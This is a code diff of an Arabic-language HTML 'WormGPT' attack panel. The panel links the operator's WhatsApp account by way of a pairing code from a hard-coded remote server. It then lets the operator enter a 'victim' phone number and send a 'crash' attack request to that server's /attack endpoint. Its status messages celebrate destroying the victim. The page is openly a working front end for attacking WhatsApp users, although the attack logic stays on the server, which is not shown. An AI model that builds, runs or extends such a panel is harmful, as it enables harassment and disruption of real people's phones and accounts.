@@ -2,64 +2,73 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>WormGPT Console</title>
+    <title>WormGPT Panel</title>
     <style>
-        body { background: #000; color: #f00; font-family: monospace; text-align: center; padding: 40px; }
-        .container { border: 2px solid #f00; padding: 20px; display: inline-block; background: #080808; }
-        input { background: #111; color: #0f0; border: 1px solid #f00; padding: 10px; margin: 10px; width: 250px; }
-        #pair-code { font-size: 32px; color: #fff; background: #222; padding: 10px; display: none; margin: 15px; border: 1px dashed #f00; }
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; }
+        .main { border: 2px solid #f00; display: inline-block; padding: 30px; margin-top: 50px; background: #0a0a0a; box-shadow: 0 0 15px #f00; }
+        input { background: #111; color: #0f0; border: 1px solid #f00; padding: 12px; width: 260px; margin: 10px; }
+        #pair-display { font-size: 40px; color: #fff; background: #222; padding: 15px; display: none; margin: 20px; border: 2px dashed #f00; }
+        .btn { background: #f00; color: #fff; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>WORM-GPT ATTACK PANEL</h1>
+    <div class="main">
+        <h1>☢️ WORM-GPT CONSOLE ☢️</h1>
         
-        <div id="step1">
-            <input type="text" id="phone" placeholder="رقمك (966...)">
-            <button onclick="getCode()" style="padding:10px; cursor:pointer;">طلب كود الربط</button>
-            <div id="pair-code"></div>
-            <p id="msg">انتظر الكود واربطه في واتساب...</p>
+        <div id="setup">
+            <p>أدخل رقمك للحصول على كود الربط:</p>
+            <input type="text" id="myPhone" placeholder="9665xxxxxxxx">
+            <br>
+            <button class="btn" onclick="fetchCode()">طلب الكود</button>
+            <div id="pair-display"></div>
+            <p id="info">الكود سيظهر هنا وفي كونسول Katabump أيضاً.</p>
         </div>
 
-        <div id="step2" class="hidden">
-            <h2 style="color:#0f0;">✔️ تم الارتباط بنجاح!</h2>
-            <input type="text" id="target" placeholder="رقم الضحية للهجوم">
-            <button onclick="startAttack()" style="padding:10px; background:#f00; color:#fff; font-weight:bold;">ابدأ الهجوم الشامل 🚀</button>
-            <p id="attack-status"></p>
+        <div id="target-box" class="hidden">
+            <h2 style="color: #0f0;">✅ تم الاتصال!</h2>
+            <p>أدخل رقم الضحية لبدء الكراش:</p>
+            <input type="text" id="victim" placeholder="9665xxxxxxxx">
+            <br>
+            <button class="btn" onclick="launch()">إطلاق الهجوم الشامل 🚀</button>
+            <p id="log"></p>
         </div>
     </div>
 
     <script>
-        const API_URL = "http://51.75.118.79:20225"; 
+        const API = "http://51.75.118.79:20225";
 
-        async function getCode() {
-            const phone = document.getElementById('phone').value;
-            const codeBox = document.getElementById('pair-code');
-            codeBox.style.display = "block";
-            codeBox.innerText = "جاري التحميل...";
+        async function fetchCode() {
+            const num = document.getElementById('myPhone').value;
+            const display = document.getElementById('pair-display');
+            display.style.display = "block";
+            display.innerText = "جاري السحب...";
 
-            const res = await fetch(`${API_URL}/get-code?phone=${phone}`);
-            const data = await res.json();
-            codeBox.innerText = data.code;
+            try {
+                const r = await fetch(`${API}/get-code?phone=${num}`);
+                const d = await r.json();
+                display.innerText = d.code;
 
-            // ابدأ فحص حالة الربط كل 3 ثواني
-            const check = setInterval(async () => {
-                const statusRes = await fetch(`${API_URL}/check-status`);
-                const statusData = await statusRes.json();
-                if (statusData.connected) {
-                    clearInterval(check);
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                }
-            }, 3000);
+                // فحص الربط كل 3 ثواني
+                const interval = setInterval(async () => {
+                    const statusR = await fetch(`${API}/check-status`);
+                    const statusD = await statusR.json();
+                    if (statusD.connected) {
+                        clearInterval(interval);
+                        document.getElementById('setup').classList.add('hidden');
+                        document.getElementById('target-box').classList.remove('hidden');
+                    }
+                }, 3000);
+            } catch (e) {
+                display.innerText = "السيرفر لا يستجيب!";
+            }
         }
 
-        async function startAttack() {
-            const target = document.getElementById('target').value;
-            document.getElementById('attack-status').innerText = "🔥 جاري جلد الضحية...";
-            await fetch(`${API_URL}/attack?target=${target}`);
-            document.getElementById('attack-status').innerText = "🚀 انتهى الهجوم!";
+        async function launch() {
+            const vic = document.getElementById('victim').value;
+            document.getElementById('log').innerText = "🔥 جاري التدمير...";
+            await fetch(`${API}/attack?target=${vic}`);
+            document.getElementById('log').innerText = "🏁 تم الهجوم!";
         }
     </script>
 </body>
